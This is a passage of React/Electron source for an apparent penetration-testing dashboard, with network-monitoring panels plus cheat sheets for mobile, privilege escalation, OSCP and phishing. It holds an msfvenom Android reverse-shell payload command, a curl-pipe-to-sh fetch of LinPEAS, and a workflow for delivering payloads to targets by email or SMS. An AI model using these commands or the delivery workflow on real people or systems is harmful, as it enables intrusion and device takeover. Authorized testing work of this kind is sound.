                                        <thead className="sticky top-0 z-10">
                                            <tr className={darkMode ? 'bg-gray-900 text-gray-300 border-b border-gray-700' : 'bg-gray-100 text-gray-700 border-b border-gray-200'}>
                                                <th className="text-left py-2.5 pr-3 pl-2">Proto</th>
                                                <th className="text-left py-2.5 pr-3">Local</th>
                                                <th className="text-left py-2.5 pr-3">Remote (IP:port)</th>
                                                <th className="text-left py-2.5 pr-3">Service</th>
                                                <th className="text-left py-2.5 pr-3 min-w-[140px]">Host / Website</th>
                                                <th className="text-left py-2.5 pr-2">State</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {liveConnections.slice(0, 200).map((row, i) => (
                                                <tr key={i} className={darkMode ? 'border-b border-gray-700/50 hover:bg-gray-700/30' : 'border-b border-gray-100 hover:bg-gray-50'}>
                                                    <td className="py-2 pr-3 pl-2 font-mono text-xs">{row.proto}</td>
                                                    <td className="py-2 pr-3 font-mono text-xs">{row.local}</td>
                                                    <td className="py-2 pr-3 font-mono text-xs">{row.foreign}</td>
                                                    <td className="py-2 pr-3 text-xs font-medium">{row.service ?? '—'}</td>
                                                    <td className="py-2 pr-3 text-xs truncate max-w-[180px]" title={row.hostname ?? row.foreign}>{row.hostname ?? '—'}</td>
                                                    <td className="py-2 pr-2 font-mono text-xs">{row.state}</td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                                {liveConnections.length > 200 && <p className={`text-xs mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Showing first 200 of {liveConnections.length}</p>}
                            </div>
                        )}

                        {/* WiFi profiles: save credentials, connect this PC, then monitor this device's traffic */}
                        {isElectron && (
                            <div className={`p-5 rounded-xl border-2 ${darkMode ? 'bg-gray-800/80 border-cyan-500/40' : 'bg-white border-cyan-100 shadow-sm'}`}>
                                <h3 className="font-semibold text-lg mb-1 flex items-center gap-2">
                                    <Wifi size={18} /> WiFi / Network
                                </h3>
                                <p className={`text-sm mb-4 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                    Save your WiFi credentials and connect this computer to the network. Then use <strong>Live connections</strong> above to monitor <strong>this device&apos;s traffic</strong> (browser, apps). Credentials are stored locally on this machine. Monitoring shows traffic from this PC only, not other devices on the WiFi.
                                </p>
                                <div className={`grid gap-4 mb-4 p-4 rounded-lg border ${darkMode ? 'bg-gray-900/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Profile name</label>
                                            <input type="text" value={wifiProfileName} onChange={e => setWifiProfileName(e.target.value)} placeholder="Home WiFi" className={`w-full px-3 py-2 rounded-lg text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>SSID (network name)</label>
                                            <input type="text" value={wifiProfileSsid} onChange={e => setWifiProfileSsid(e.target.value)} placeholder="MyNetwork" className={`w-full px-3 py-2 rounded-lg text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                        <div>
                                            <label className={`block text-xs font-medium mb-1 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Password</label>
                                            <input type="password" value={wifiProfilePassword} onChange={e => setWifiProfilePassword(e.target.value)} placeholder="••••••••" className={`w-full px-3 py-2 rounded-lg text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                        </div>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={async () => {
                                            if (!wifiProfileSsid.trim()) return;
                                            setWifiConnectError(null);
                                            setWifiConnectMessage(null);
                                            try {
                                                const res = await (window as any).ipcRenderer.invoke('wifi-save-profile', { name: wifiProfileName || wifiProfileSsid, ssid: wifiProfileSsid.trim(), password: wifiProfilePassword });
                                                if (res.success) {
                                                    setWifiProfileName(''); setWifiProfileSsid(''); setWifiProfilePassword('');
                                                    (window as any).ipcRenderer.invoke('wifi-get-profiles').then((r: { success: boolean; profiles?: typeof wifiProfiles }) => { if (r.success && r.profiles) setWifiProfiles(r.profiles); });
                                                } else setWifiConnectError(res.error || 'Failed to save');
                                            } catch (e) { setWifiConnectError(e instanceof Error ? e.message : 'Failed'); }
                                        }}
                                        className={`px-4 py-2 rounded-lg text-sm font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}
                                    >
                                        Save WiFi profile
                                    </button>
                                </div>
                                {wifiConnectMessage && <p className="text-sm text-green-600 dark:text-green-400 mb-2">{wifiConnectMessage}</p>}
                                {wifiConnectError && <p className="text-sm text-red-500 mb-2">{wifiConnectError}</p>}
                                {wifiProfiles.length > 0 && (
                                    <div className="space-y-2">
                                        <span className={`text-xs font-medium ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Saved profiles — connect this PC</span>
                                        <ul className={`divide-y rounded-lg border ${darkMode ? 'divide-gray-700 border-gray-700' : 'divide-gray-200 border-gray-200'}`}>
                                            {wifiProfiles.map(p => (
                                                <li key={p.id} className={`flex items-center justify-between gap-2 py-2 px-3 ${darkMode ? 'bg-gray-900/30' : 'bg-gray-50/50'}`}>
                                                    <span className="font-medium truncate">{p.name || p.ssid}</span>
                                                    <span className={`text-xs font-mono truncate ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>{p.ssid}</span>
                                                    <div className="flex gap-2 shrink-0">
                                                        <button
                                                            type="button"
                                                            onClick={async () => {
                                                                setWifiConnectError(null); setWifiConnectMessage(null);
                                                                try {
                                                                    const res = await (window as any).ipcRenderer.invoke('wifi-connect', p.id);
                                                                    if (res.success) setWifiConnectMessage(res.message || 'Connected.');
                                                                    else setWifiConnectError(res.error || 'Connect failed');
                                                                } catch (e) { setWifiConnectError(e instanceof Error ? e.message : 'Connect failed'); }
                                                            }}
                                                            className={`px-3 py-1.5 rounded-lg text-sm font-medium ${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}
                                                        >
                                                            Connect
                                                        </button>
                                                        <button
                                                            type="button"
                                                            onClick={async () => {
                                                                try {
                                                                    await (window as any).ipcRenderer.invoke('wifi-delete-profile', p.id);
                                                                    (window as any).ipcRenderer.invoke('wifi-get-profiles').then((r: { success: boolean; profiles?: typeof wifiProfiles }) => { if (r.success && r.profiles) setWifiProfiles(r.profiles); });
                                                                } catch { /* ignore */ }
                                                            }}
                                                            className={`px-3 py-1.5 rounded-lg text-sm ${darkMode ? 'text-gray-400 hover:bg-gray-700' : 'text-gray-600 hover:bg-gray-200'}`}
                                                        >
                                                            Remove
                                                        </button>
                                                    </div>
                                                </li>
                                            ))}
                                        </ul>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Who's on my network: scan IP + MAC, mark known, flag unknown */}
                        {isElectron && (
                            <div className={`p-5 rounded-xl border-2 ${darkMode ? 'bg-gray-800/80 border-amber-500/40' : 'bg-white border-amber-200 shadow-sm'}`}>
                                <h3 className="font-semibold text-lg mb-1 flex items-center gap-2">
                                    <Shield size={18} /> Who&apos;s on my network
                                </h3>
                                <p className={`text-sm mb-4 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                                    Scan your home network to see devices (IP + MAC). Mark devices you own as <strong>Known</strong>. Any device not in your known list shows as <strong>Unknown</strong> so you can spot a random or new device on your WiFi. (Scan uses the ARP cache; run it after normal use for a fuller list.)
                                </p>
                                <div className="flex gap-2 mb-4">
                                    <button
                                        type="button"
                                        disabled={networkDevicesLoading}
                                        onClick={async () => {
                                            setNetworkDevicesLoading(true);
                                            try {
                                                const res = await (window as any).ipcRenderer.invoke('get-network-devices');
                                                if (res.success) setNetworkDevices(res.devices || []);
                                            } catch { /* ignore */ }
                                            setNetworkDevicesLoading(false);
                                        }}
                                        className={`px-4 py-2 rounded-lg text-sm font-medium flex items-center gap-2 ${networkDevicesLoading ? 'opacity-50 cursor-wait' : ''}${darkMode ? 'bg-amber-600 hover:bg-amber-500 text-white' : 'bg-amber-500 hover:bg-amber-600 text-white'}`}
                                    >
                                        {networkDevicesLoading ? <Loader2 size={16} className="animate-spin" /> : null}
                                        Scan network
                                    </button>
                                    {networkDevices.length > 0 && (
                                        <span className={`text-xs self-center ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>
                                            {networkDevices.length} device(s) · {networkDevices.filter(d => !knownDevices.some(k => (k.mac || '').toLowerCase() === (d.mac || '').toLowerCase() || k.ip === d.ip)).length} unknown
                                        </span>
                                    )}
                                </div>
                                {networkDevices.length > 0 && (
                                    <div className={`overflow-x-auto max-h-80 overflow-y-auto rounded-lg border ${darkMode ? 'border-gray-700' : 'border-gray-200'}`}>
                                        <table className="w-full text-sm">
                                            <thead className="sticky top-0 z-10">
                                                <tr className={darkMode ? 'bg-gray-900 text-gray-300 border-b border-gray-700' : 'bg-gray-100 text-gray-700 border-b border-gray-200'}>
                                                    <th className="text-left py-2.5 pr-3 pl-2">IP</th>
                                                    <th className="text-left py-2.5 pr-3">MAC</th>
                                                    <th className="text-left py-2.5 pr-3">Name</th>
                                                    <th className="text-left py-2.5 pr-3">Status</th>
                                                    <th className="text-left py-2.5 pr-2">Action</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {networkDevices.map((d, i) => {
                                                    const known = knownDevices.find(k => (k.mac || '').toLowerCase() === (d.mac || '').toLowerCase() || k.ip === d.ip);
                                                    const isUnknown = !known;
                                                    return (
                                                        <tr
                                                            key={`${d.ip}-${d.mac}-${i}`}
                                                            className={isUnknown ? (darkMode ? 'border-b border-gray-700 bg-amber-900/20' : 'border-b border-gray-100 bg-amber-50') : (darkMode ? 'border-b border-gray-700/50' : 'border-b border-gray-100')}
                                                        >
                                                            <td className="py-2 pr-3 pl-2 font-mono text-xs">{d.ip}</td>
                                                            <td className="py-2 pr-3 font-mono text-xs">{d.mac}</td>
                                                            <td className="py-2 pr-3 text-xs">{known?.name ?? '—'}</td>
                                                            <td className="py-2 pr-3">
                                                                <span className={`px-2 py-0.5 rounded text-xs font-medium ${known ? (darkMode ? 'bg-green-900/50 text-green-400' : 'bg-green-100 text-green-800') : (darkMode ? 'bg-amber-900/50 text-amber-400' : 'bg-amber-100 text-amber-800')}`}>
                                                                    {known ? 'Known' : 'Unknown'}
                                                                </span>
                                                            </td>
                                                            <td className="py-2 pr-2">
                                                                {known ? (
                                                                    <button
                                                                        type="button"
                                                                        onClick={async () => {
                                                                            try {
                                                                                await (window as any).ipcRenderer.invoke('remove-known-device', d.mac);
                                                                                (window as any).ipcRenderer.invoke('get-known-devices').then((r: { success: boolean; devices?: typeof knownDevices }) => { if (r.success && r.devices) setKnownDevices(r.devices); });
                                                                            } catch { /* ignore */ }
                                                                        }}
                                                                        className={`text-xs ${darkMode ? 'text-gray-400 hover:underline' : 'text-gray-600 hover:underline'}`}
                                                                    >
                                                                        Remove from known
                                                                    </button>
                                                                ) : (
                                                                    <div className="flex items-center gap-2 flex-wrap">
                                                                        <input
                                                                            type="text"
                                                                            placeholder="Device name"
                                                                            value={knownDeviceName[d.mac] ?? ''}
                                                                            onChange={e => setKnownDeviceName(prev => ({ ...prev, [d.mac]: e.target.value }))}
                                                                            className={`w-28 px-2 py-1 rounded text-xs border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}
                                                                        />
                                                                        <button
                                                                            type="button"
                                                                            onClick={async () => {
                                                                                const name = (knownDeviceName[d.mac] || '').trim() || 'My device';
                                                                                try {
                                                                                    await (window as any).ipcRenderer.invoke('add-known-device', { mac: d.mac, ip: d.ip, name });
                                                                                    setKnownDeviceName(prev => { const n = { ...prev }; delete n[d.mac]; return n; });
                                                                                    (window as any).ipcRenderer.invoke('get-known-devices').then((r: { success: boolean; devices?: typeof knownDevices }) => { if (r.success && r.devices) setKnownDevices(r.devices); });
                                                                                } catch { /* ignore */ }
                                                                            }}
                                                                            className="px-2 py-1 rounded text-xs font-medium bg-cyan-600 hover:bg-cyan-500 text-white"
                                                                        >
                                                                            Mark as known
                                                                        </button>
                                                                    </div>
                                                                )}
                                                            </td>
                                                        </tr>
                                                    );
                                                })}
                                            </tbody>
                                        </table>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Live packet capture */}
                        {isElectron && (
                            <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-cyan-500/40' : 'bg-cyan-50/50 border-cyan-200'}`}>
                                <h3 className="font-semibold text-lg mb-2 flex items-center gap-2">
                                    <Radio size={18} /> Live packet capture
                                </h3>
                                <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Capture packets on the wire. Start capture to see traffic in real time. Run the app as Administrator for raw capture.</p>
                                <div className="flex flex-wrap items-center gap-2 mb-3">
                                    <label className={`text-xs font-medium ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Interface</label>
                                    {captureInterfaces.length > 0 ? (
                                        <select value={captureInterface} onChange={e => setCaptureInterface(e.target.value)} className={`min-w-[200px] px-2 py-1.5 rounded font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`}>
                                            {captureInterfaces.map(i => (
                                                <option key={i.index} value={i.index}>{i.index}. {i.name}</option>
                                            ))}
                                        </select>
                                    ) : (
                                        <input type="text" value={captureInterface} onChange={e => setCaptureInterface(e.target.value)} placeholder="0 or 1" className={`w-20 px-2 py-1.5 rounded font-mono text-sm border ${darkMode ? 'bg-gray-800 border-gray-600 text-white' : 'bg-white border-gray-300 text-gray-900'}`} />
                                    )}
                                    {!isCapturing ? (
                                        <button
                                            type="button"
                                            onClick={async () => {
                                                setCaptureError(null);
                                                setCapturePackets([]);
                                                try {
                                                    const res = await (window as any).ipcRenderer.invoke('start-packet-capture', { interface: captureInterface || '1' });
                                                    if (res.success) setIsCapturing(true);
                                                    else setCaptureError(res.error || 'Failed to start capture');
                                                } catch (e) {
                                                    const msg = e instanceof Error ? e.message : String(e);
                                                    setCaptureError(msg);
                                                }
                                            }}
                                            className="px-4 py-2 rounded-lg text-sm font-medium bg-cyan-600 hover:bg-cyan-500 text-white"
                                        >
                                            Start capture
                                        </button>
                                    ) : (
                                        <button
                                            type="button"
                                            onClick={async () => {
                                                try { await (window as any).ipcRenderer.invoke('stop-packet-capture'); } catch { /* ignore */ }
                                                setIsCapturing(false);
                                            }}
                                            className="px-4 py-2 rounded-lg text-sm font-medium bg-red-600 hover:bg-red-500 text-white"
                                        >
                                            Stop capture
                                        </button>
                                    )}
                                    {isCapturing && <span className={`text-sm ${darkMode ? 'text-cyan-400' : 'text-cyan-600'}`}>Capturing… {capturePackets.length} packets</span>}
                                </div>
                                {captureError && (
                                    <p className="text-sm text-red-500 mb-2">
                                        {captureError.includes('ENOENT') || (captureError.includes('spawn') && captureError.includes('tshark'))
                                            ? 'Packet capture tool not found. Add the capture binary to build/capture/ or install it (see build/capture/README.md).'
                                            : captureError}
                                    </p>
                                )}
                                {/* Traffic summary from packets */}
                                {capturePackets.length > 0 && (
                                    <div className="mb-3 p-3 rounded-lg border border-cyan-500/30 bg-cyan-900/10">
                                        <div className="text-xs font-semibold mb-2 text-cyan-600 dark:text-cyan-400">Traffic summary (from captured packets)</div>
                                        <div className="flex flex-wrap gap-4 text-sm">
                                            <div>
                                                <span className={darkMode ? 'text-gray-500' : 'text-gray-500'}>Top source IPs: </span>
                                                {(() => {
                                                    const counts: Record<string, number> = {};
                                                    capturePackets.forEach(p => { if (p.src && p.src !== '-') counts[p.src] = (counts[p.src] || 0) + 1; });
                                                    const top = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 5);
                                                    return <span className="font-mono">{top.map(([ip, n]) => `${ip} (${n})`).join(', ') || '—'}</span>;
                                                })()}
                                            </div>
                                            <div>
                                                <span className={darkMode ? 'text-gray-500' : 'text-gray-500'}>Top dest IPs: </span>
                                                {(() => {
                                                    const counts: Record<string, number> = {};
                                                    capturePackets.forEach(p => { if (p.dst && p.dst !== '-') counts[p.dst] = (counts[p.dst] || 0) + 1; });
                                                    const top = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 5);
                                                    return <span className="font-mono">{top.map(([ip, n]) => `${ip} (${n})`).join(', ') || '—'}</span>;
                                                })()}
                                            </div>
                                        </div>
                                    </div>
                                )}
                                <div className="overflow-x-auto max-h-96 overflow-y-auto border rounded-lg">
                                    <table className="w-full text-sm">
                                        <thead className={darkMode ? 'bg-gray-900 sticky top-0' : 'bg-gray-100 sticky top-0'}>
                                            <tr className={darkMode ? 'text-gray-400 border-b border-gray-700' : 'text-gray-600 border-b border-gray-200'}>
                                                <th className="text-left py-2 pr-2 whitespace-nowrap">Time</th>
                                                <th className="text-left py-2 pr-2 whitespace-nowrap">Source</th>
                                                <th className="text-left py-2 pr-2 whitespace-nowrap">Destination</th>
                                                <th className="text-left py-2 pr-2 whitespace-nowrap">Protocol</th>
                                                <th className="text-left py-2 pr-2 whitespace-nowrap">Length</th>
                                                <th className="text-left py-2">Info</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {capturePackets.slice(0, 300).map((p, i) => (
                                                <tr key={i} className={darkMode ? 'border-b border-gray-700/50' : 'border-b border-gray-100'}>
                                                    <td className="py-1 pr-2 font-mono text-xs whitespace-nowrap">{p.time ? p.time.replace(/^.*\s/, '') : '—'}</td>
                                                    <td className="py-1 pr-2 font-mono text-xs">{p.src}</td>
                                                    <td className="py-1 pr-2 font-mono text-xs">{p.dst}</td>
                                                    <td className="py-1 pr-2 font-mono text-xs">{p.protocol}</td>
                                                    <td className="py-1 pr-2 font-mono text-xs">{p.length}</td>
                                                    <td className="py-1 font-mono text-xs">{p.info}</td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                                {capturePackets.length > 300 && <p className={`text-xs mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>Showing latest 300 of {capturePackets.length}</p>}
                            </div>
                        )}

                        {/* Alerts panel — SIEM-style */}
                        <div className={`p-4 rounded-xl border ${darkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'}`}>
                            <h3 className="font-semibold text-lg mb-2 flex items-center gap-2">
                                <Shield size={18} /> Alerts
                            </h3>
                            <p className={`text-sm mb-3 ${darkMode ? 'text-gray-400' : 'text-gray-600'}`}>Simple alert log. Add test alerts or use for notes during an engagement.</p>
                            <div className="flex gap-2 mb-3">
                                <button
                                    type="button"
                                    onClick={() => setMonitorAlerts(prev => [{ id: String(Date.now()), time: new Date().toLocaleTimeString(), message: 'Test alert — connection on port 4444', severity: 'high' }, ...prev])}
                                    className={`px-3 py-1.5 rounded-lg text-sm font-medium ${darkMode ? 'bg-amber-600/80 hover:bg-amber-500/80 text-white' : 'bg-amber-500 hover:bg-amber-600 text-white'}`}
                                >
                                    Add test alert
                                </button>
                                {monitorAlerts.length > 0 && (
                                    <button type="button" onClick={() => setMonitorAlerts([])} className={`px-3 py-1.5 rounded-lg text-sm ${darkMode ? 'text-gray-400 hover:bg-gray-700' : 'text-gray-600 hover:bg-gray-200'}`}>
                                        Clear
                                    </button>
                                )}
                            </div>
                            <div className="space-y-1 max-h-48 overflow-y-auto">
                                {monitorAlerts.length === 0 ? (
                                    <p className={`text-sm ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>No alerts yet.</p>
                                ) : (
                                    monitorAlerts.map(a => (
                                        <div key={a.id} className={`flex items-start gap-2 p-2 rounded border text-sm ${darkMode ? 'bg-gray-900/50 border-gray-700' : 'bg-gray-50 border-gray-200'}`}>
                                            <span className={`font-mono text-xs shrink-0 ${darkMode ? 'text-gray-500' : 'text-gray-500'}`}>{a.time}</span>
                                            <span className={`px-1.5 py-0.5 rounded text-xs font-medium ${SEVERITY_COLORS[a.severity] || SEVERITY_COLORS.info}`}>{a.severity}</span>
                                            <span className={darkMode ? 'text-gray-300' : 'text-gray-700'}>{a.message}</span>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                )}

                {mode === 'web' && (
                    <div className="space-y-6 max-w-4xl">
                        <h3 className="font-semibold text-lg">Web testing quick reference</h3>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Common directories</div>
                            <pre className={`p-3 rounded-lg border font-mono text-xs ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {['/admin', '/backup', '/config', '/.git', '/api', '/upload', '/uploads', '/wp-admin', '/phpmyadmin', '/server-status', '/.env', '/debug', '/test', '/dev'].join('\n')}
                            </pre>
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Common parameters (LFI/SQLi/XSS)</div>
                            <pre className={`p-3 rounded-lg border font-mono text-xs ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {['file', 'path', 'page', 'doc', 'id', 'cmd', 'exec', 'query', 'search', 'q', 'redirect', 'url', 'callback', 'return'].join(', ')}
                            </pre>
                        </div>
                        <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                            Use the <strong>Web Scanner</strong> tab in Scanners for full automated testing (dir busting, SQLi, XSS, headers).
                        </p>
                    </div>
                )}

                {mode === 'mobile' && (
                    <div className="space-y-6 max-w-4xl">
                        <h3 className="font-semibold text-lg">Mobile (iOS / Android) cheatsheet</h3>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Android — ADB</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`adb devices
adb shell pm list packages
adb pull /data/data/<pkg>/databases/
adb install evil.apk
# Msfvenom APK: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -o evil.apk`}
                            </pre>
                            <CopyButton text="adb devices\nadb shell pm list packages" darkMode={darkMode} />
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Objection (runtime hooking)</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`objection -g <app> explore
# In objection: android hooking list activities, android sslpinning disable`}
                            </pre>
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Frida</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`frida -U -f <pkg> -l script.js --no-pause
frida-ps -U`}
                            </pre>
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>iOS (jailbreak)</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`# SSH into device (default alpine)
ssh root@<device-ip>
# Objection for iOS
objection -g <bundleid> explore`}
                            </pre>
                        </div>
                    </div>
                )}

                {mode === 'pe' && (
                    <div className="space-y-6 max-w-4xl">
                        <h3 className="font-semibold text-lg">Privilege escalation</h3>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Linux — quick checks</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
env
id; uname -a
# LinPEAS: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`}
                            </pre>
                            <CopyButton text="sudo -l\nfind / -perm -4000 2>/dev/null\ncat /etc/crontab" darkMode={darkMode} />
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Windows — quick checks</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`whoami /priv
systeminfo
schtasks /query /fo LIST /v
Get-Service | Where-Object {$_.Status -eq 'Running'}
# WinPEAS: .\\winpeas.exe
# JuicyPotato, PrintSpoofer, token impersonation`}
                            </pre>
                        </div>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Shell upgrade (Linux TTY)</div>
                            <pre className={`p-3 rounded-lg border font-mono text-sm whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z then: stty raw -echo; fg
# Or: script /dev/null -c bash`}
                            </pre>
                        </div>
                    </div>
                )}

                {mode === 'oscp' && (
                    <div className="space-y-6 max-w-4xl">
                        <h3 className="font-semibold text-lg">OSCP / exam helper</h3>
                        <ul className={`space-y-2 text-sm ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>
                            <li><strong>Time:</strong> 23h 45m — pace yourself; document as you go.</li>
                            <li><strong>Report:</strong> Methodology, findings, proof (screenshots), remediation. Use the Reports section for STRIX output.</li>
                            <li><strong>Workflow:</strong> Recon → enumerate services → search exploits (this hub) → get shell → PE → document.</li>
                            <li><strong>Cheatsheets:</strong> Keep Reverse Shells + Msfvenom + Service Exploits open; copy-paste saves time.</li>
                            <li><strong>Notes:</strong> One file per machine (hostname, IP, users, passwords, flags).</li>
                        </ul>
                        <div>
                            <div className={`text-xs font-semibold uppercase mb-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>Report structure (short)</div>
                            <pre className={`p-3 rounded-lg border font-mono text-xs whitespace-pre ${darkMode ? 'bg-gray-900 border-gray-700 text-gray-200' : 'bg-gray-100 border-gray-200 text-gray-800'}`}>
                                {`1. Executive Summary
2. Scope
3. Methodology (Recon, Enum, Exploitation, PE)
4. Findings (per host: vuln, impact, steps, proof)
5. Remediation
6. Appendix (screenshots, commands)`}
                            </pre>
                        </div>
                    </div>
                )}

                {mode === 'phishing' && (
                    <div className="space-y-6 max-w-4xl">
                        <div className={`p-4 rounded-xl border text-sm ${darkMode ? 'bg-gray-800/50 border-gray-700 text-gray-300' : 'bg-gray-50 border-gray-200 text-gray-700'}`}>
                            <strong>Phishing &amp; payload delivery.</strong> Send exploits to the target: email phishing, SMS phishing, or payload link/file. <strong>Step 1:</strong> Build your payload (Reverse Shells or Msfvenom) and start the listener. <strong>Step 2:</strong> Host the payload below or use a link shortener. <strong>Step 3:</strong> Deliver via email or SMS (send from here with Twilio). Use only in authorized engagements.
                        </div>

                        {/* Live test link — one-click for iPhone / self-test (Electron only) */}
                        {isElectron && (
                            <div className={`p-4 rounded-xl border ${darkMode ? 'bg-cyan-900/20 border-cyan-500/50' : 'bg-cyan-50 border-cyan-200'}`}>
                                <h3 className="font-semibold text-lg mb-2">Live test link (iPhone / self-test)</h3>
                                <p className={`text-sm mb-3 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                                    Testing on your iPhone? Get a <strong>live link</strong> below — no file to choose. The link opens a safe test page so you can verify SMS/email delivery. Then send that link to your number via Twilio.
                                </p>
                                {!payloadServerUrl ? (
                                    <>
                                        <button
                                            type="button"
                                            disabled={liveLinkLoading}
                                            onClick={async () => {
                                                setLiveLinkError(null);
                                                setLiveLinkLoading(true);
                                                try {
                                                    const fileRes = await (window as any).ipcRenderer.invoke('create-test-payload-file');
                                                    if (!fileRes.success || !fileRes.path) {
                                                        const msg = fileRes.error || 'Could not create test file';
                                                        setLiveLinkError(msg);
                                                        return;
                                                    }
                                                    setPayloadFilePath(fileRes.path);
                                                    const serverRes = await (window as any).ipcRenderer.invoke('start-payload-server', { port: payloadServerPort, filePath: fileRes.path, lhost });
                                                    if (serverRes.success && serverRes.url) {
                                                        setPayloadServerUrl(serverRes.url);
                                                        setPayloadUrl(serverRes.url);
                                                    } else {
                                                        setLiveLinkError(serverRes.error || 'Could not start server');
                                                    }
                                                } catch (e) {
                                                    const msg = e instanceof Error ? e.message : 'Failed — are you running the desktop app (Electron)?';
                                                    setLiveLinkError(msg);
                                                } finally {
                                                    setLiveLinkLoading(false);
                                                }
                                            }}
                                            className={`px-5 py-3 rounded-xl font-medium flex items-center gap-2 ${liveLinkLoading ? 'opacity-70 cursor-wait ' : ''}${darkMode ? 'bg-cyan-600 hover:bg-cyan-500 text-white' : 'bg-cyan-600 hover:bg-cyan-700 text-white'}`}
                                        >
                                            {liveLinkLoading ? <><Loader2 size={18} className="animate-spin" /> Creating link…</> : <>Create test link &amp; start server</>}
                                        </button>
                                        {liveLinkError && (
